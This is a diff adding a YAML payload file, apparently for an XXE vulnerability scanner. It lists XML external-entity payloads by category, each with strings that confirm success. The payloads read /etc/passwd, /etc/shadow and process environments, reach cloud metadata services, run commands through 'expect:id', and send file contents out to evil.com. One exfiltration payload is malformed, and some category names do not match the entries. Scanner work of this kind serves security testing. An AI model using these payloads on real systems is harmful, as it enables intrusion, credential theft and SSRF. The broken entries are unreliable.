@@ -1,0 +1,210 @@
+category_map:
+  detect:
+    - basic_xxe
+    - param_entity
+    - svg_xxe
+    - soap_xxe
+    - rss_xxe
+  file_read:
+    - passwd_read
+    - hosts_read
+    - winini_read
+    - environ_read
+    - shadow_read
+  ssrf:
+    - ssrf_localhost
+    - ssrf_private
+    - ssrf_metadata
+    - expect_header
+  blind:
+    - blind_dtd
+    - blind_length
+    - blind_oob
+  bypass:
+    - utf16_bypass
+    - utf7_bypass
+    - param_entity_bypass
+    - dtd_external
+    - cdata_bypass
+    - comment_bypass
+
+detect_payloads:
+  - - basic_xxe
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+    - generic
+    - - "root:"
+      - /bin/bash
+  - - param_entity
+    - '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>test</root>'
+    - generic
+    - - "root:"
+      - /bin/bash
+  - - svg_xxe
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
+    - svg
+    - - "root:"
+      - /bin/bash
+  - - soap_xxe
+    - '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>'
+    - soap
+    - - "root:"
+      - /bin/bash
+  - - rss_xxe
+    - "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<rss version=\"2.0\"><channel><title>&xxe;</title></channel></rss>"
+    - rss
+    - - "root:"
+      - /bin/bash
+
+file_read_payloads:
+  - - passwd_read
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+    - generic
+    - - "root:"
+      - /bin/bash
+  - - hosts_read
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>'
+    - generic
+    - - localhost
+      - 127.0.0.1
+  - - winini_read
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>'
+    - generic
+    - - "[fonts]"
+      - "[extensions]"
+  - - environ_read
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>'
+    - generic
+    - - "PATH="
+      - "HOME="
+  - - shadow_read
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>'
+    - generic
+    - - "root:"
+      - "$6$"
+      - "!"
+  - - cmdline_read
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]><root>&xxe;</root>'
+    - generic
+    - - python
+      - java
+  - - iis_webconfig
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">]><root>&xxe;</root>'
+    - generic
+    - - "<configuration>"
+      - connectionString
+  - - proc_self_status
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/status">]><root>&xxe;</root>'
+    - generic
+    - - "Name:"
+      - "Pid:"
+
+ssrf_payloads:
+  - - ssrf_localhost
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><root>&xxe;</root>'
+    - generic
+    - - response
+  - - ssrf_private
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://10.0.0.1">]><root>&xxe;</root>'
+    - generic
+    - - response
+  - - ssrf_metadata_aws
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'
+    - generic
+    - - ami-id
+      - instance-id
+  - - ssrf_metadata_gcp
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><root>&xxe;</root>'
+    - generic
+    - - metadata
+  - - expect_header
+    - '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect:id">]><root>&xxe;</root>'
+    - generic
+    - - "uid="
+      - "gid="
+  - - ssrf_port_scan
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><root>&xxe;</root>'
+    - generic
+    - - response
+
+blind_payloads:
+  - - blind_dtd
+    - '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><root>test</root>'
+    - generic
+    - - response
+  - - blind_length
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+    - generic
+    - - response
+  - - blind_oob
+    - '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY & #x25; exfil SYSTEM http://evil.com/?data=%file;">">%eval;%exfil;]><root>test</root>'
+    - generic
+    - - response
+  - - blind_error
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent_file_12345">]><root>&xxe;</root>'
+    - generic
+    - - error
+      - exception
+      - warning
+  - - blind_parameter
+    - '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % param1 SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; content ''%param1;''">>%eval;]><root>&content;</root>'
+    - generic
+    - - response
+
+bypass_payloads:
+  - - utf16_bypass
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+    - utf-16le
+    - - "root:"
+      - /bin/bash
+  - - utf7_bypass
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+    - utf-7
+    - - "root:"
+      - /bin/bash
+  - - param_entity_bypass
+    - '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>test</root>'
+    - generic
+    - - "root:"
+      - /bin/bash
+  - - dtd_external
+    - '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><root>test</root>'
+    - generic
+    - - response
+  - - cdata_bypass
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><![CDATA[&xxe;]]></root>'
+    - generic
+    - - "root:"
+      - /bin/bash
+  - - comment_bypass
+    - '<!DOCTYPE foo [<!-- comment --><!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+    - generic
+    - - "root:"
+      - /bin/bash
+  - - encoding_bypass
+    - '<?xml version="1.0" encoding="iso-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+    - generic
+    - - "root:"
+      - /bin/bash
+  - - double_encoding
+    - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://%2f%2fetc%2fpasswd">]><root>&xxe;</root>'
+    - generic
+    - - "root:"
+      - /bin/bash
+
+xml_params:
+  - xml
+  - xml_data
+  - xml_file
+  - data
+  - body
+  - content
+  - document
+  - payload
+  - input
+  - request
+  - message
+  - soap_body
+  - svg
+  - feed
+  - rss
+  - atom
